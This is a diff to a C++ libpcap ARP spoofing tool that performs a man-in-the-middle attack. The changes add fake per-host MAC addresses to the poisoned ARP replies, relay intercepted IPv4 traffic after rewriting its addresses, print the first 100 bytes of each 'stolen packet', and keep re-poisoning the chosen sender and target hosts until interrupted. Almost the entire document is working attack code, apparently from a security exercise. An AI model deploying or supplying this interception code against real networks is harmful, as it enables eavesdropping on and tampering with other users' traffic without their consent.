@@ -1,4 +1,4 @@
-#define core_num 2
+#define core_num 4
 #include <iostream>
 #include <string>
 #include <stdint.h>
@@ -17,11 +17,20 @@
 #include <signal.h>
 
 #if core_num < 2
-#error "core_num is minimal 2, even if there is only one"
+#error "set core_num minimal 2"
 #endif
 #define dbg std::cout<<"dbg: "<<__LINE__<<std::endl;
 
+struct maccmp{
+	bool operator()(const mac_addr& a,const mac_addr& b) const{
+		return memcmp(&a,&b,6)<0;
+	}
+};
+
 std::map<uint32_t,mac_addr> ip_to_mac;
+std::map<mac_addr,mac_addr,maccmp> m2vm;
+std::map<mac_addr,mac_addr,maccmp> vm2m;
+
 std::map<uint32_t,std::set<uint32_t>> s2t;
 std::map<uint32_t,std::set<uint32_t>> t2s;
 
@@ -37,14 +46,14 @@ pthread_mutex_t stdoutmutex = PTHREAD_MUTEX_INITIALIZER;
 ipv4_addr my_ip;
 mac_addr my_mac;
 
-int sigint_flag=0;
+int sigint_flag=0; // 0 : continue spoofing -> 1 : sigint detected -> 2 : sender arp table recovered
 
 void sigintHandler(int sig)
 {
 	if(sigint_flag)
 		exit(0);
 	pthread_mutex_lock(&stdoutmutex);
-	std::cout<<"terminate process started : it will take about 5 second"<<std::endl;
+	std::cout<<"\nterminate process started : it will take about 5 second \ninterupt again for forced exit"<<std::endl;
 	pthread_mutex_unlock(&stdoutmutex);
 	sigint_flag=1;
 }
@@ -56,6 +65,8 @@ void setsigint(){
 }
 
 void add_ip(const ipv4_addr& ip,pcap_t* handle){
+	if(ip_to_mac.find(ip.word)!=ip_to_mac.end())
+		return;
 	for(;;){
 		arp_eth_ipv4 packet(my_mac,my_ip,ip);
 		pcap_sendpacket(handle,packet,sizeof packet);
@@ -68,15 +79,21 @@ void add_ip(const ipv4_addr& ip,pcap_t* handle){
 		memcpy(&packet,ptr,sizeof packet);
 		if(packet.sip.word==ip.word&&packet.arptype==htons(0x0002)){
 			ip_to_mac[ip.word]=packet.smac;
-			return;
+			break;
 		}
 	}
+	static uint32_t nonce=0x12345678;nonce++;
+	mac_addr vm=my_mac;memcpy(&vm,&nonce,4);
+	m2vm[ip_to_mac[ip.word]]=vm;
+	vm2m[vm]=ip_to_mac[ip.word];
 }
 
 void arp_poison(const ipv4_addr& sip,const ipv4_addr& tip){
 	mac_addr smac=ip_to_mac[sip.word];
-	arp_eth_ipv4 packet(my_mac,smac,tip,sip);
+	mac_addr vtmac=m2vm[ip_to_mac[tip.word]];
+	arp_eth_ipv4 packet(vtmac,smac,tip,sip);
 	pthread_mutex_lock(&omutex);
+	//std::cout<<sizeof packet<<std::endl;
 	pcap_sendpacket(ohandle,packet,sizeof packet);
 	pthread_mutex_unlock(&omutex);
 }
@@ -98,7 +115,7 @@ void process_arp(arp_eth_ipv4* packet){
 			if(packet->dst.is_broadcast()){
 				usleep(200000); // 0.2 second delay to wait until legal reply processed first
 				flag=0;
-			}
+			} // no legal reply when it is not broadcast
 			arp_poison(packet->sip,packet->tip);
 		}
 	}
@@ -117,14 +134,18 @@ void process_arp(arp_eth_ipv4* packet){
 }
 
 void process_ip(ipv4_eth* packet,int len){
-	if(s2t.find(packet->sip.word)==s2t.end()) // not from sender
-		return;
-	if(s2t[packet->sip.word].find(packet->tip.word)==s2t[packet->sip.word].end()) // not to target
-		return;
-	mac_addr tmac=ip_to_mac[packet->tip.word];
 	
-	pthread_mutex_lock(&stdoutmutex); // display stolen packet
-	std::cout<<std::string(packet->sip)<<" -> "<<std::string(packet->tip)<<" : "<<len<<"bytes\n";
+	std::cout<<"!"<<std::string(packet->src)<<" -> "<<std::string(packet->dst)<<" : "<<len<<"bytes\n";
+	
+	if(vm2m.find(packet->dst)==vm2m.end())
+		return;
+	if(m2vm.find(packet->src)==m2vm.end())
+		return;
+	
+	packet->dst = vm2m[packet->dst];
+	
+	pthread_mutex_lock(&stdoutmutex); // display stolen packet..or we can just use wireshark
+	std::cout<<"[+]"<<std::string(packet->sip)<<" -> "<<std::string(packet->tip)<<" : "<<len<<"bytes\n";
 	int plen=len;if(plen>100)plen=100;
 	char* str=(char*)packet;
 	for(int i=0;i<plen;i++)
@@ -132,8 +153,8 @@ void process_ip(ipv4_eth* packet,int len){
 	std::cout<<'\n'<<std::endl;
 	pthread_mutex_unlock(&stdoutmutex);
 	
-	packet->src=my_mac;
-	packet->dst=tmac;
+	packet->src = m2vm[packet->src];
+	// relay packet
 	pthread_mutex_lock(&omutex);
 	pcap_sendpacket(ohandle,*packet,len);
 	pthread_mutex_unlock(&omutex);
@@ -153,7 +174,7 @@ void* process_packet(void* param){
 		}
 		//nothing to do when it is neither ipv4 nor arp
 	}
-	
+	free(param);
 	pthread_mutex_lock(&mutex);
 	proc_manage.push_back(idx);
 	pthread_mutex_unlock(&mutex);
@@ -162,7 +183,7 @@ void* process_packet(void* param){
 }
 
 void* continue_poisoning(void* param){
-	auto& stpairs=*(std::vector<std::pair<ipv4_addr,ipv4_addr>>*)param;
+	std::vector<std::pair<ipv4_addr,ipv4_addr>>& stpairs=*(std::vector<std::pair<ipv4_addr,ipv4_addr>>*)param;
 	while(!sigint_flag){
 		for(auto&[s,t]:stpairs)
 			arp_poison(s,t);
@@ -196,21 +217,32 @@ int main(int c,char **v){
 		printf("pcap error : %s\n",errbuf);
 		exit(1);
 	}
-	pcap_t* ohandle=pcap_open_live(v[1],0,0,0,errbuf);
+	ohandle=pcap_open_live(v[1],0,0,0,errbuf);
 	if(ohandle==nullptr){
 		printf("pcap error : %s\n",errbuf);
 		exit(1);
 	}
 	for(int i=2;i<c;i++)
 		add_ip(v[i],handle);
+	std::cout<<"m - vm"<<std::endl;
+	for(auto[m,vm]:m2vm)
+		std::cout<<std::string(m)<<' '<<std::string(vm)<<std::endl;
+	std::cout<<"vm - m"<<std::endl;
+	for(auto[m,vm]:vm2m)
+		std::cout<<std::string(m)<<' '<<std::string(vm)<<std::endl;
 	pthread_t th[core_num];
 	int usedth[core_num]={0};
 	void * nevermind;
 	for(int i=1;i<core_num;i++)
 		proc_manage.push_back(i);
 	sem_init(&sem, 0, core_num-1);
-	pthread_create(th,NULL,continue_poisoning,&stpairs);
 	setsigint();
+	
+	if(pthread_create(th,NULL,continue_poisoning,&stpairs)){
+		printf("thread error\n");
+		exit(1);
+	}
+	
 	while(sigint_flag<2){
 		pcap_pkthdr* hdr;
 		const uint8_t* ptr;
@@ -237,9 +269,10 @@ int main(int c,char **v){
 		if(usedth[idx])
 			pthread_join(th[idx], &nevermind);
 		else usedth[idx]=1;
-		pthread_create(th+idx,NULL,process_packet,packet);
-		
-		free(packet);
+		if(pthread_create(th+idx,NULL,process_packet,packet)){
+			printf("thread error\n");
+			exit(1);
+		}
 	}
 	
 	sem_destroy(&sem);
